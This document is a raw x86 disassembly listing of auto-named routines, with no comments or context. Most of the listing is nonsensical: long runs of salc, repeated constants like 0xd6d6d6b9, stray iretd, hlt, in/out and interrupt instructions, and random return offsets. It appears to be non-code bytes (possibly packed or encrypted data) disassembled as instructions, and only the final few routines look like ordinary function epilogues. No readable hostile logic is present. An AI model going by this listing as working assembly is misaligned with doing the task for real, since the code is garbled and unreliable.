mov esp 0xc3464652
xchg [ ecx - 0x3e ] cl
bound eax [ esi + 0x46 ]
inc esi

sub_469a30

sub_469aba
retn
sub_469af5
xchg [ ecx - 0x3e ] cl
and dh [ ecx + 0x3ac5b9b9 ]
bound esp [ edx + 0x46 ]
dec ecx
retn 0xb11f
sub_469b05
mov ecx 0x4e39c5b9
inc esi
dec ecx
retn 0x4641
sub_469b29
dec ecx
retn 0x67ce
sub_469c13
inc esi
inc esi

sub_469c2a
xchg edi eax
lodsd [ esi ]
mov ecx 0xaf91cdb9
add [ edx - 0x29294647 ] edi
salc
salc
scasb [ edi ]
mov esp 0xc5b9b99f
adc [ edx - 0x3d ] 0x86
dec ecx
retn 0xa2cf
sub_469d2c
xor eax 0x6d464666
mov bh 0xaf
int3
sub_469dee
mov ecx 0x4e462eb9
inc esi
inc esi

sub_469df6
retn
sub_469e2d
add esi [ edx - 0x466c5251 ]
mov ecx 0x8fc3d6d6
dec ecx
retn 0x4193
sub_469e5a
mov ecx 0x4641c349
inc esi
inc esi
push ss
mov ecx 0x4646ead0
inc esi
scasb [ edi ]
0xafb9b998 0xb584
sub_46a05f
add ecx esi
adc eax 0xa2fbae16
mov ecx 0xae10afb9
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
and [ ebp - 0x4b ] bh
scasd [ edi ]
0xd6b9b9bd 0xd6d6
sub_46a07f
salc
salc
push ss

sub_46a083
add ebp esi
push ss
adc eax 0x15662c15
adc eax 0xc3cb1515
out 0xbb al
mov ecx 0x11b916b9
push ss
adc eax 0xb99589af
mov ecx 0x49d6d6d6
retn
sub_46a170
mov ecx 0xccaf4e33
inc esi
inc esi
inc esi
salc
and bh cl
adc edx [ eax + 0x20662c1c ]
iretd
sub_46a1c3
retn
sub_46a2b7
adc ebx edx
sbb al 0x20
iretd
sub_46a2e9
adc esi [ esi + 0x2c ]
aas
scasd [ edi ]
xchg ebp eax
xchg esp eax
mov ecx 0xd6d6d6b9
salc
dec ecx
retn
sub_46a316
add edi [ edx - 0x465ade52 ]
mov ecx 0x97f8ae16
mov ecx 0xcb1f1fb9
or ebx [ esi - 0x46f9d3e9 ]
xor [ esi ] dl
iretd
sub_46a359
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
sbb ch cl
sbb [ ecx ] 0xd6d6851b
salc

sub_46a36e
retn
sub_46a36f
xor bh [ ebp - 0x50e94647 ]
or [ edi + 0x46 ] ebx
inc esi

sub_46a58b
add esp edx
scasb [ edi ]
cmpsb [ esi ] [ edi ]
dec esi
inc esi
inc esi
retn
sub_46a5a6
xchg [ ecx - 0x3e ] cl
not [ ebp + 0xbcbb9b9 ]

sub_46a5b1
add esp edx
scasb [ edi ]
cld
dec esi
inc esi
inc esi
retn
sub_46a5b9
xchg [ edi - 0x46466ecb ] ch
dec ecx
retn
sub_46a5c1
test [ esi + 0x3bcbb9b9 ] ebx
scasb [ edi ]

sub_46a5c9

sub_46a676
pop esi
inc ebp
inc esi
inc esi
adc eax 0x119d7510
int 0xbe

sub_46a682
retn
sub_46a684
mov ebx 0x1b7eb9b9
push esi
scasd [ edi ]
or [ ebx - 0x29294647 ] ah
dec ecx
in al 0xcf
sbb edi [ edx - 0x304df431 ]
adc edi [ esi - 0x3045fc33 ]
add esp [ edx - 0x3041fc33 ]
add ebp [ esi - 0x504dfc33 ]
hlt
sub_46a8a5
add edi [ edx - 0x7045fc33 ]
test esi edx
salc
salc
salc
salc
scasb [ edi ]
pop ss
mov bh 0xb9
mov ecx 0xb203cb16
push ss

sub_46a8bc
add eax [ esi - 0x512e46ea ]
inc esi
inc esi
inc esi

sub_46a8c6
add eax [ esi + 0x1ac3cb16 ]
mov ebx 0xb916b9b9
xor ecx [ esi - 0x35 ]
add edx [ edx - 0x508750ea ]
mov ecx 0xd6d6d6b9
sub al 0x4
and bh cl
cmp esi esi
sbb [ eax ] esp
iretd
sub_46a8ff
add edx [ edx + 0x20 ]
iretd
sub_46a99e
mov ecx 0xf6cbcbb9
mov ebx 0x53aeb9b9
inc esp
inc esi
inc esi

sub_46a9bf
mov ecx 0x4994c2b9
retn 0x559c
sub_46a9ec
xchg [ ecx - 0x3d ] cl
dec ebx
inc esi
inc esi
inc esi
scasb [ edi ]
ror [ edi + 0x46 ] 0x1
inc esi
retn
sub_46aa77
pop es
xchg edx eax
mov ecx 0x47422eb9
inc esi
inc esi

sub_46aa81
retn 0xd262
sub_46aa84
inc esi
inc esi
inc esi
push ss
sub al 0x46
mov ecx 0x86c30a10
dec ecx
retn 0x9261
sub_46aa9b
inc ecx
push ss
scasd [ edi ]
leave
fwait
mov ecx 0xd6d6d6b9
salc
salc
dec ecx
retn 0x5724
sub_46ab18
xchg [ edi - 0x46460550 ] ch
salc
dec ecx
retn 0x4642
sub_46ab26
cmp ah [ edx + 0x6a ]
jg r-xdata
mov ecx 0x626222c5
inc esi

bound ebx [ edx + 0x49 ]
retn
sub_46ab3e
inc ebx
inc esi
inc esi
inc esi
add [ edx ] 0x62
push esi
inc esp
dec ecx
int1
add eax 0x86c32002
dec ecx
retn 0xa15b
sub_46ab52
mov ecx 0x6222c5b9
push edx
inc esi

sub_46ab5c
lds edi [ ecx ]
inc edx
inc esi
dec ecx
ror [ ebp - 0x5f ] 0xb9
mov ecx 0x626222c5
inc esi

sub_46abc2
dec ecx
retn 0xbc70
sub_46abc6
mov ecx 0xbfae10b9
inc ebx
inc esi
inc esi
scasd [ edi ]
ficom [ edi + 0x46 ]
inc esi
salc
salc
retn
sub_46ac06
xchg edx eax
mov ebx 0x1615b9b9
scasb [ edi ]
push edx
lahf
mov ecx 0x4a82c5b9
adc eax 0x6eaf442c
cmpsd [ esi ] [ edi ]
mov ecx 0x11d6d6b9
iretd
sub_46ad0a
rcr [ edi ] 0xd8
mov ecx 0xb9ffdfb9
inc esi
inc esi
inc esi
mov cl 0xbf
adc [ ecx + edi * 4 ] edx
xor ah [ edx + 0x5e ]
scasd [ edi ]
iretd
sub_46addc
xchg [ edi - 0x46465795 ] ch
salc
salc
dec ecx
retn 0xabcb
sub_46adef
mov ecx 0xd6d6d6b9
salc
salc
salc
and bh cl
add edi [ eax + 0x4647422e ]
inc esi

sub_46ae01
retn
sub_46ae29
add esp [ esi + ebx - 0x30df9bd4 ]
add esp [ edx + 0x20662c1e ]
iretd
sub_46ae37
add esp [ eax + 0x20742c1e ]
iretd
sub_46ae3e
add ebp [ esi + 0x20662c1e ]
iretd
sub_46ae45
add ebp [ esi + ebx - 0x30df9cd4 ]
add ebp [ edx + 0x202f2c1e ]
iretd
sub_46ae53
add ebp [ eax + 0x20662c1e ]
iretd
sub_46ae5a
add esi [ esi + 0x20632c1e ]
iretd
sub_46ae61
add esi [ esi + ebx - 0x2550d0d4 ]
dec edx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
int3
sub_46b1bc
dec edx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
retn
sub_46b1c9
dec ecx
retn
sub_46b1e0
0x4642
sub_46b238
sbb dh [ esi + 0x4d ]
and [ ebp - 0x69 ] bh
dec ecx
retn
sub_46b240
rol [ edi + 0x1bcdb9b9 ] 0x1
mov esi 0x5603f149

sub_46b296
retn
sub_46b2f3
mov al 0xaf
mov ch 0x41
inc esi
inc esi
salc
salc
mov ecx 0x86c30a11
dec ecx
retn 0xabd4
sub_46b304
mov ecx 0xcb022cb9
add ebp esi
adc eax 0x9455ae16
mov ecx 0xcb562cb9
add esi [ esi + 0x33af1615 ]
movsd [ edi ] [ esi ]
mov ecx 0xd6d6d6b9
salc

sub_46b323
retn
sub_46b341
add ah [ edi + 0x2aafb9b9 ]
lahf
mov ecx 0xd6d6d6b9
salc

sub_46b370
xchg [ edi - 0x46464e89 ] ch
salc
dec ecx
retn
sub_46b401
mov ecx 0x498d7db9
retn 0x8ff6
sub_46b409
mov ecx 0xfc20afb9
mov ecx 0x2cd6d6b9
daa
scasd [ edi ]
mov al [ ecx - 0x34294647 ]
add ah [ edx + 0x69 ]
push ss
scasd [ edi ]
[ ecx + edi * 4 - 0x29292947 ]
sub_46b427
salc
sub al 0x44

sub_46b42b
or edi [ edx + 0x33b91617 ]
pop esi
iretd
sub_46b4da
inc esi
inc esi
fidivr [ cs : esi + eax * 2 + 0x46 ]
mov ecx 0x90ae4e10
test eax 0xbecdb9b9
int 0x80
scasb [ edi ]
xchg ebp eax
mov bh [ ecx + 0x47bec5b9 ]
dec ecx
retn
sub_46b522
retn
sub_46b523
cmp bh [ ebx + 0x7516b9b9 ]
mov al 0x10
mov ecx 0x86c30a11
dec ecx
retn 0xbb2c
sub_46b5b7
or ebx [ esi + 0x20212c1f ]
iretd
sub_46b5be
or ebx [ edi + ebx - 0x30df97d4 ]
or ebx [ edx + 0xbcf201f ]
cwde
int 0x8e
and bh cl
add esp [ edx + 0x3e2c8675 ]
and bh cl
add esp [ eax - 0x59f430e0 ]
pop ds

sub_46b5e0
add ebp [ esi + 0x4e03cd16 ]
and bh cl
or esp [ esi + ebp * 4 - 0x46465106 ]
pop ds
retn
sub_46b5f1
xchg [ ecx - 0x3d ] cl
adc [ edx + 0x46 ] al
inc esi

sub_46b627
mov ecx 0x20212cb9
iretd
sub_46b69a
add edx [ edx + 0x464333af ]
inc esi
salc
salc
salc
salc
salc
int 0xbe
retn
sub_46b6c3
mov al 0x49
retn 0xb7e0
sub_46b70c
xchg [ ecx - 0x3e ] cl
ficomp [ eax + 0x21afb9b9 ]
cli
mov ecx 0xd6d6d6b9
mov ecx 0x8af9a33
mov [ 0xffffffff857db9b9 ] al
dec ecx
shl al 0xa0
mov ecx 0xe834afb9
mov ecx 0xd6d6d6b9
iretd
sub_46b734
or edi [ esi - 0x324dec31 ]
add edi [ edx - 0x3251fc31 ]
add edi [ esi - 0x3255fc31 ]
add esi [ edx + 0x75b603cf ]
xchg [ ebp - 0x6c ] dh
iretd
sub_46b853
retn
sub_46b882
scasd [ edi ]
inc esi
int1
mov ecx 0xd6d6d6b9
scasb [ edi ]
pop ds
idiv [ ecx + 0x2cb1fb9 ]
bound edi [ esi + 0x16 ]

sub_46b8eb
add eax esi
scasd [ edi ]
das
mov ebp 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc

sub_46b930
mov ecx 0xbcb11b9
mov edx 0xb233b917
iretd
sub_46b99c
sbb esp [ eax - 0x4fc430e0 ]
and bh cl
adc ebx [ edx ]
sub al 0x2f
sbb al 0x2c
sub [ eax ] ah
iretd
sub_46ba26
mov ch 0x90
mov ecx 0x4a33b9b9
int 0x3
dec esi
mov ecx 0x33b92216
mov edx 0x8faf8f75
idiv [ ecx - 0x29292947 ]
dec ecx
retn 0x9d13
sub_46baf0
mov ecx 0x727f20b9
push edi
dec ecx
retn
sub_46bb4d
sbb edi [ edx - 0x50bdef47 ]
dec esp
nop
mov ecx 0x282c1eb9
and bh cl
add esp [ esi + 0x20232c1e ]
iretd
sub_46bb80
mov al 0x49
retn 0x93d0
sub_46bc57
in al dx
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
dec ecx
retn
sub_46bc93
add edi [ edx - 0x4ff430e0 ]
pop ds

sub_46bc9b
add esp [ edx - 0x46400851 ]
mov ecx 0xd6d6d6d6
salc
salc
salc
dec ecx
retn
sub_46bcab
push esi
inc esi
inc esi
inc esi
retn
sub_46bcb1
dec ecx
retn
sub_46bcb3
fst [ ebx - 0x793c4647 ]
dec ecx
retn
sub_46bcbb
aad 0x93
mov ecx 0xaf462cb9
rcl [ ebx - 0x29294647 ] 0xb9
shr [ esi - 0x50b9b9ba ] 0x1
mov eax [ 0xffffffffd6d6b9b9 ]

sub_46bcd6

sub_46bcd7
retn 0xb9bd
sub_46bd38
retn
sub_46bd39
mov ebx 0x1615b9b9
scasd [ edi ]
add [ ecx + edi * 4 - 0x30df2947 ] ecx
add edi [ edi + ebp * 4 - 0x464663e4 ]
pop ds
retn
sub_46bd79
aaa
scasd [ edi ]
sub_46bdbe
add ebp esi
scasb [ edi ]
jmp sub_46bd79
sub_46be49
add esp [ eax + 0x20232c1e ]
iretd
sub_46be91
xchg ebp eax
0x33b9b9b9 0xcb4e
sub_46be99
retn
sub_46beca
salc
salc
salc
int 0xaa
pop ss
pop ss
int 0xb
dec esi
adc eax 0x8fc31110
dec ecx
retn 0xf755
sub_46bedd
mov ecx 0x1c0bfeb9
inc esi
inc esi
and [ edi + 0x47 ] bh
dec ecx
retn
sub_46bfbb
xchg [ ecx - 0x3d ] cl
cmp al 0xb9
mov ecx 0xcb9e3bcb

sub_46bfc7
idiv [ ebx + 0x4aaeb9b9 ]
jmp sub_46bf88
sub_46bfcf
mov ecx 0xc34986c3
idiv al
mov ecx 0xfe3bcbb9

sub_46bfdc

sub_46bfdd
idiv [ ebx - 0x4f514647 ]
0x86c3b9b9 0x94af
sub_46c029
mov ecx 0x56462eb9
inc esi
inc esi

sub_46c031
add ebx [ esi - 0x4654ed51 ]
mov ecx 0xcf2080cd
adc ebp [ eax ]
iretd
sub_46c0c8
scasb [ edi ]
mov edx 0xae16b9b9
dec esi
xchg edi eax
mov ecx 0xcb1606b9
retn
sub_46c259
jmp sub_4039c0
sub_46c260
pop ebp
retn
sub_46c405
jmp sub_4039c0
sub_46c40c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46c47e
retn
sub_46c47f
jmp sub_4039c0
j_sub_46c47e
jmp sub_46c47e
sub_46c486
pop ebp
retn
